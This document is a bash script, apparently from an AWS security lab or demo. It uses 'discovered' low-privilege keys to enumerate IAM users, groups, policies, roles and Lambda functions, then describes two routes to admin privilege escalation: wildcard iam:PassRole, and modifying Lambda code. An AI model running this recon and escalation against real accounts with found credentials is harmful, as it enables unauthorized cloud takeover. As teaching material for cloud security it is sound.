

source env.sh

echo "If you are not familiar with inline vs managed policies see https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html"

if [ -z $1 ]; then
  echo "using low privilege keys found in keys.json"
  export AWS_ACCESS_KEY_ID=`cat keys.json | jq -r '.AccessKey.AccessKeyId'`
  export AWS_SECRET_ACCESS_KEY=`cat keys.json | jq -r '.AccessKey.SecretAccessKey'`
  echo "----------------- The following will fail because our discovered user has limited IAM permissions --------------------"
else
  echo "Using high privilege keys"
fi

echo "Determine the identity of the discovered credentials"
aws sts get-caller-identity

user_arn=`aws sts get-caller-identity | jq '.Arn'`
user_name=`echo $user_arn | sed 's|\"||g' | cut -d '/' -f 2`


echo "See if any interesting inline policies are attached directly to the user."
aws iam list-user-policies --user-name $USER_NAME

echo "No luck. Next see if any managed policies are attached to the user."
aws iam list-attached-user-policies --user-name $USER_NAME

echo "Also, no luck. The user must be in a group which grants the privileges."
GROUP_NAME=`aws iam list-groups-for-user --user-name $USER_NAME | jq -r '.Groups[0].GroupName'`

echo "First check for group inline policies"
aws iam list-group-policies --group-name $GROUP_NAME

echo "Still no luck! Now check for attached group policies".
aws iam list-attached-group-policies --group-name $GROUP_NAME

echo "At last! To see what permissions the policy has, use list-policy-versions (because managed policies can have many versions)"
echo "Then use get-policy-version to get the permissions using the latest or default version"

printf "\n\n------------------------- Automated recon with low-priv keys ---------------------------------\n\n"

echo "Run enumerage-iam.py --access-key --secret-key    according to https://github.com/praetorian-code/enumerate-iam"
echo "Skipping to the results which show that we have iam list-roles and iam lambda list-functions"

aws lambda list-functions --max-items 5 | jq '.Functions[].FunctionName'
aws iam list-roles --max-items 5 


aws iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/AWSLambdaFullAccess
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AWSLambdaFullAccess --version-id v8

echo "Notice that the policy includes iam:PassRole and the Resource is '*'"
echo "An experienced attacker will recognized that this is the Wildcard Passrole priv-esc to Admin."
echo "We have discovered two paths to privilege escalation."
echo "1. We can run arbitrary functions. If a lambda function has a high-privilege role attached and we can modify the code, we can gain any privilege in the attached role."
echo "2. Since our group allows Wildcard Passrole via the AWSLambdaFullAccess, we can create a lambda and attach any role that already exists."
